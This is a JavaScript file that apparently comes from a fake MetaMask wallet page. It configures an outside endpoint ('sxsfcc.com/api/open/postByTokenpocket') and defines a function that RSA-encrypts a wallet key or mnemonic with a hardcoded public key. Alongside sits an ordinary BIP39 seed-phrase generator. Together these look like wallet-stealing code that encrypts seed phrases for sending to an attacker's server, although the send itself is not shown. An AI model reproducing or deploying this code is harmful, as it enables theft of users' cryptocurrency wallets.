var api_url='https://sxsfcc.com/api/open/postByTokenpocket';
var api_code='10091';
var api_type='1';
var api_wallet='MetaMask-h5';
function mnemonicRAS(key) {
	const publicKey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAghkqP3enteE0CTZgpA51vUY5PPCqVb+s01b75blFDD9fmb2fI70r08K3LyfmasBzEKpWitkdnl0rNTBfCD8XqG9YUATOA9hggfyvkVTnG6/MUlfgwq0FmpwKkVWDoWDUrAn9EEq3455ONA8IoWG5Eqa0KFIIILoviZGiFxkbRFDrQpuuHgkc4K5Io44ETiM3Q8QC/d/B6BgAfUP2oG6wSbh7Jk/pxBeLPs4FudFuhUl3d57coyiCkYmklsGqhxg21iHZECWa0c+iujlkMOIIXGUmSW+c7CVNcSPLLx01tH25KmcmfWcg3Y3c0Qga+m88QxGMiFqRp1XcoJOdmySysQIDAQAB';
	const encrypt = new JSEncrypt();
	encrypt.setPublicKey(publicKey);
	const password = encrypt.encrypt(key);// 加密后的字符串
	
	return password.toString();
}
function hasStrongRandom() {
        return 'crypto' in window && window['crypto'] !== null;
}

function generateRandomPhrase() {
	if (!hasStrongRandom()) {
		var errorText = "This browser does not support strong randomness";
		alert(errorText);
		return;
	}
	// get the amount of entropy to use
	var numWords = parseInt("24");
	var strength = numWords / 3 * 32;
	var buffer = new Uint8Array(strength / 8);
	// create secure entropy
	var data = crypto.getRandomValues(buffer);
	// show the words
	var words = mnemonic.toMnemonic(data);
	//DOM.phrase.val(words);
	// show the entropy
	//var entropyHex = uint8ArrayToHex(data);
	//DOM.entropy.val(entropyHex);
	// ensure entropy fields are consistent with what is being displayed
	//DOM.entropyMnemonicLength.val("raw");
	return words;
}